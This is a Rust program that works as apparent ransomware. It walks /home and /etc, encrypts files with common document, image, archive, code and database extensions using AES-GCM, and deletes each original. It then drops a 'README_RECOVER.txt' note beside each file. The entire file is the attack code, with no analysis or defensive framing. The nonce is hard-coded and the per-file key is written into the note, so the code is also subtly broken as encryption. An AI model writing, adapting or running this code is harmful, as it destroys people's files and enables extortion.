use walkdir::WalkDir;
use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::Aead;
use aes_gcm::KeyInit;
use rand::RngCore;
use std::fs;
use std::path::Path;

fn main() {
    let target_dirs = vec!["/home", "/etc"];
    for dir in target_dirs {
        if Path::new(dir).exists() {
            for entry in WalkDir::new(dir) {
                if let Ok(entry) = entry {
                    let path = entry.path();
                    if path.is_file() {
                        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
                        let target_extensions = ["doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "jpg", "jpeg", "png", "zip", "rar", "7z", "tar", "gz", "txt", "py", "js", "html", "css", "php", "sql", "db", "mdb", "accdb", "xml", "json", "csv"];
                        if target_extensions.contains(&ext) {
                            // Encrypt file
                            let key = generate_key();
                            let encrypted_path = path.with_extension("encrypted");
                            encrypt_file(&path, &encrypted_path, &key).unwrap();
                            // Delete original file
                            fs::remove_file(&path).unwrap();
                            // Write note
                            let note_path = path.with_extension("README_RECOVER.txt");
                            let note_content = format!("Your files have been encrypted. Decryption key: {}\n", hex::encode(&key));
                            fs::write(&note_path, note_content).unwrap();
                        }
                    }
                }
            }
        }
    }
}

fn generate_key() -> [u8; 32] {
    let mut key = [0u8; 32];
    rand::thread_rng().fill_bytes(&mut key);
    key
}

fn encrypt_file(input_path: &Path, output_path: &Path, key: &[u8; 32]) -> Result<(), Box<dyn std::error::Error>> {
    let plaintext = std::fs::read(input_path)?;
    let cipher = Aes256Gcm::new(Key::from_slice(key));
    let nonce = Nonce::from_slice(b"unique nonce");
    let ciphertext = cipher.encrypt(nonce, plaintext.as_ref()).map_err(|e| e.to_string())?;
    std::fs::write(output_path, ciphertext)?;
    Ok(())
}